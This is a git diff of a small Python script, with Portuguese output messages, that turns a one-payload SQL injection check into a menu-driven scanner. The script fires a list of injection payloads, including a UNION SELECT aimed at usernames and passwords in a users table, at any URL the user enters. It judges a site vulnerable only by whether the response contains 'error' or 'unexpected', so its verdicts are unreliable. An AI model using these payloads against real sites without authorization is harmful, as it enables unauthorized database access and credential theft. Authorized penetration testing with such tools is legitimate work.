@@ -1,23 +1,55 @@
 import requests
+from time import sleep
 
-# URL alvo
-url = input("")
+print("""
+                      [@] choose your SQL vulnerability test:
+                      [1] payload test
+                      [2] EXIT
+""")
 
-# Payload de teste (tentando injetar código SQL)
-payload = "' OR 1=1 --"
+choice = input("input =>>  ")
+url = input("Input URL: ") # Target URL
+payloads = ["' OR 1=1 --", "' UNION SELECT NULL --", "' AND '1'='1' --", "' AND 1=CONVERT(int, 'a') --", "' UNION SELECT null, username, password FROM users --"]
 
-# Parâmetros de exemplo (dependendo da URL e da forma como a consulta é feita)
-params = {'search': payload}
+def payload_test(url, payloads):
+    if url[:7] != "http://":
+        url = "http://"+url
 
-# Fazendo a requisição
-response = requests.get(url, params=params)
+    try:
+        for payload in payloads:
+            params = {'search': payload}
+            response = requests.get(url, params=params)
 
-# Verificando a resposta
-if "error" in response.text.lower():
-    print("\033[91m[INFO] Possível vulnerabilidade de SQL Injection detectada. \033[97m")
-elif "unexpected" in response.text.lower():
-    print("\033[0m [INFO] O site pode estar vulnerável a SQL Injection. \033[97m")
-else:
-    print("\033[32m [INFO] Nenhuma vulnerabilidade detectada. \033[97m")
+            print(f"\033[34m[INFO] Testando payload: {payload}\033[97m")
+            print(f"Status da requisição: {response.status_code}")
+            
+            if "error" in response.text.lower():
+                print("\033[91m[INFO] Possível vulnerabilidade de SQL Injection detectada. \033[97m \n")
+            elif "unexpected" in response.text.lower():
+                print("\033[0m[INFO] O site pode estar vulnerável a SQL Injection. \033[97m \n")
+            else:
+                print("\033[32m[INFO] Nenhuma vulnerabilidade detectada. \033[97m \n")
 
-print(f"\033[34mStatus da requisição: {response.status_code}\033[97m")  # Displays the HTTP status code
+    except requests.exceptions.RequestException as e:
+        print(f"\033[91m[ERRO] Falha na requisição: {e}\033[97m \n")
+        sleep(2)
+
+    except KeyboardInterrupt:
+        print("\nExiting ..!!!")
+        sleep(2)
+
+try:
+    if choice =='1':
+        payload_test(url,payloads)
+
+    elif choice =='2': # EXIT
+        print("\nExiting ..!!!")
+        sleep(2)
+    
+    else:
+        print("try again ...")
+        sleep(1)
+
+except KeyboardInterrupt:
+    print("\nExiting ..!!!")
+    sleep(2)
